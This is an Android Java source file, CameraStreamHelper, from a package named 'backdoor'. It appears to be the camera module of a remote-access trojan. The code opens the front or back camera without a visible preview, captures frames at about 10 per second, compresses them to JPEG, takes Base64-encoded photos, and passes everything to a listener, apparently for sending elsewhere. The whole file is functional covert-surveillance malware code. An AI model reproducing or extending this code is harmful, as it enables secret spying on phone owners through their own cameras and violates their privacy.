package com.lazyframework.backdoor;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;

import androidx.annotation.RequiresApi;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraStreamHelper implements Camera.PreviewCallback {

    private static final String TAG = "CameraStreamHelper";

    // ==================== CONFIG ====================
    // ✅ UBAH MENJADI PUBLIC STATIC FINAL
    public static final int PREVIEW_WIDTH = 640;
    public static final int PREVIEW_HEIGHT = 480;
    private static final int JPEG_QUALITY = 70;
    private static final long FRAME_INTERVAL_MS = 100; // 10 FPS

    // ==================== CONTEXT ====================
    private Context context;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Handler mainHandler;

    // ==================== CAMERA ====================
    private Camera camera;
    private int cameraId = -1;
    private boolean isFrontCamera = false;
    private AtomicBoolean isStreaming = new AtomicBoolean(false);
    private AtomicBoolean isPaused = new AtomicBoolean(false);

    // ==================== FRAME ====================
    private int frameCount = 0;
    private long lastFrameTime = 0;
    private Camera.Size previewSize;
    private OnFrameListener frameListener;

    // ==================== INTERFACE ====================
    public interface OnFrameListener {
        void onFrame(byte[] jpegData, int width, int height, int frameNumber);
        void onError(String error);
    }

    // ==================== CONSTRUCTOR ====================
    public CameraStreamHelper(Context context) {
        this.context = context;
        this.mainHandler = new Handler(context.getMainLooper());

        backgroundThread = new HandlerThread("CameraStreamThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        Log.d(TAG, "📷 CameraStreamHelper initialized");
    }

    // ==================== START STREAMING ====================
    public void startStreaming(boolean frontCamera, OnFrameListener listener) {
        if (isStreaming.get()) {
            Log.d(TAG, "⚠️ Already streaming");
            return;
        }

        this.frameListener = listener;
        this.isFrontCamera = frontCamera;

        backgroundHandler.post(() -> {
            try {
                // Pilih camera
                cameraId = findCamera(frontCamera);
                if (cameraId == -1) {
                    String error = frontCamera ? "Front camera not available" : "Back camera not available";
                    Log.e(TAG, "❌ " + error);
                    if (listener != null) {
                        mainHandler.post(() -> listener.onError(error));
                    }
                    return;
                }

                // Open camera
                try {
                    camera = Camera.open(cameraId);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Camera open error: " + e.getMessage());
                    if (listener != null) {
                        mainHandler.post(() -> listener.onError("Camera in use by another app"));
                    }
                    return;
                }

                if (camera == null) {
                    Log.e(TAG, "❌ Camera is null");
                    if (listener != null) {
                        mainHandler.post(() -> listener.onError("Camera is null"));
                    }
                    return;
                }

                // Get camera parameters
                Camera.Parameters params = camera.getParameters();

                // Set preview size
                List<Camera.Size> sizes = params.getSupportedPreviewSizes();
                previewSize = getOptimalPreviewSize(sizes, PREVIEW_WIDTH, PREVIEW_HEIGHT);

                if (previewSize == null) {
                    previewSize = sizes.get(0);
                }

                Log.d(TAG, "📱 Preview size: " + previewSize.width + "x" + previewSize.height);

                // Set parameters
                params.setPreviewSize(previewSize.width, previewSize.height);
                params.setPreviewFormat(ImageFormat.NV21);

                // Set focus mode
                try {
                    params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
                } catch (Exception e) {
                    Log.w(TAG, "Focus mode not supported: " + e.getMessage());
                }

                // Set rotation
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    // Handle rotation
                }

                camera.setParameters(params);

                // Set preview callback
                camera.setPreviewCallback(this);

                // Start preview
                camera.startPreview();

                isStreaming.set(true);
                isPaused.set(false);
                frameCount = 0;
                lastFrameTime = 0;

                Log.d(TAG, "✅ Camera streaming started: " + (frontCamera ? "FRONT" : "BACK"));

                // Send initial status
                mainHandler.post(() -> {
                    if (frameListener != null) {
                        frameListener.onError("CAMERA_STREAM_STARTED");
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "❌ Start streaming error: " + e.getMessage(), e);
                releaseCamera();
                if (listener != null) {
                    mainHandler.post(() -> listener.onError("Failed to start: " + e.getMessage()));
                }
            }
        });
    }

    // ==================== STOP STREAMING ====================
    public void stopStreaming() {
        Log.d(TAG, "⏹️ Stopping camera stream...");
        isStreaming.set(false);
        isPaused.set(false);
        releaseCamera();

        if (frameListener != null) {
            mainHandler.post(() -> frameListener.onError("CAMERA_STREAM_STOPPED"));
        }
    }

    // ==================== PAUSE / RESUME ====================
    public void pauseStreaming() {
        isPaused.set(true);
        Log.d(TAG, "⏸️ Camera stream paused");
    }

    public void resumeStreaming() {
        isPaused.set(false);
        Log.d(TAG, "▶️ Camera stream resumed");
    }

    // ==================== CAPTURE PHOTO ====================
    public void capturePhoto() {
        if (camera == null || !isStreaming.get()) {
            Log.w(TAG, "⚠️ Cannot capture: camera not streaming");
            return;
        }

        backgroundHandler.post(() -> {
            try {
                camera.takePicture(null, null, (data, camera1) -> {
                    try {
                        byte[] jpegData = data;
                        if (jpegData != null && jpegData.length > 0) {
                            Log.d(TAG, "📸 Photo captured: " + jpegData.length + " bytes");

                            // Compress if too large
                            if (jpegData.length > 2 * 1024 * 1024) {
                                jpegData = compressImage(jpegData, 80);
                            }

                            String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);

                            // Send to listener
                            if (frameListener != null) {
                                byte[] finalJpegData = jpegData;
                                mainHandler.post(() -> {
                                    frameListener.onFrame(finalJpegData, previewSize.width, previewSize.height, -1);
                                });
                            }

                            // Restart preview
                            try {
                                camera1.startPreview();
                            } catch (Exception e) {
                                Log.w(TAG, "Restart preview error: " + e.getMessage());
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Photo capture error: " + e.getMessage());
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Take picture error: " + e.getMessage());
            }
        });
    }

    // ==================== PREVIEW CALLBACK ====================
    @Override
    public void onPreviewFrame(byte[] data, Camera camera) {
        if (!isStreaming.get() || isPaused.get() || data == null) {
            return;
        }

        long now = System.currentTimeMillis();
        if (now - lastFrameTime < FRAME_INTERVAL_MS) {
            return;
        }
        lastFrameTime = now;

        frameCount++;

        try {
            // Convert NV21 to JPEG
            YuvImage yuvImage = new YuvImage(data, ImageFormat.NV21,
                    previewSize.width, previewSize.height, null);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, previewSize.width, previewSize.height),
                    JPEG_QUALITY, baos);

            byte[] jpegData = baos.toByteArray();
            baos.close();

            if (jpegData.length > 0) {
                // Send frame via listener
                if (frameListener != null) {
                    mainHandler.post(() -> {
                        frameListener.onFrame(jpegData, previewSize.width, previewSize.height, frameCount);
                    });
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Frame processing error: " + e.getMessage());
        }
    }

    // ==================== HELPER METHODS ====================

    private int findCamera(boolean front) {
        int cameraCount = Camera.getNumberOfCameras();
        Camera.CameraInfo info = new Camera.CameraInfo();

        for (int i = 0; i < cameraCount; i++) {
            Camera.getCameraInfo(i, info);
            if (front && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            } else if (!front && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                return i;
            }
        }
        return -1;
    }

    private Camera.Size getOptimalPreviewSize(List<Camera.Size> sizes, int w, int h) {
        final double ASPECT_TOLERANCE = 0.1;
        double targetRatio = (double) w / h;
        Camera.Size optimalSize = null;
        double minDiff = Double.MAX_VALUE;

        for (Camera.Size size : sizes) {
            double ratio = (double) size.width / size.height;
            if (Math.abs(ratio - targetRatio) > ASPECT_TOLERANCE) continue;
            if (Math.abs(size.height - h) < minDiff) {
                optimalSize = size;
                minDiff = Math.abs(size.height - h);
            }
        }

        if (optimalSize == null) {
            minDiff = Double.MAX_VALUE;
            for (Camera.Size size : sizes) {
                if (Math.abs(size.height - h) < minDiff) {
                    optimalSize = size;
                    minDiff = Math.abs(size.height - h);
                }
            }
        }

        return optimalSize;
    }

    private byte[] compressImage(byte[] imageData, int quality) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            bitmap.recycle();
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Compress error: " + e.getMessage());
            return imageData;
        }
    }

    private void releaseCamera() {
        try {
            if (camera != null) {
                camera.setPreviewCallback(null);
                camera.stopPreview();
                camera.release();
                camera = null;
                Log.d(TAG, "✅ Camera released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Release camera error: " + e.getMessage());
        }
    }

    // ==================== GETTERS ====================
    public boolean isStreaming() {
        return isStreaming.get();
    }

    public boolean isPaused() {
        return isPaused.get();
    }

    public int getFrameCount() {
        return frameCount;
    }

    public boolean isFrontCamera() {
        return isFrontCamera;
    }

    public void destroy() {
        stopStreaming();
        if (backgroundThread != null) {
            try {
                backgroundThread.quitSafely();
                backgroundThread = null;
            } catch (Exception e) {
                Log.w(TAG, "Thread quit error: " + e.getMessage());
            }
        }
        context = null;
        Log.d(TAG, "💀 CameraStreamHelper destroyed");
    }
}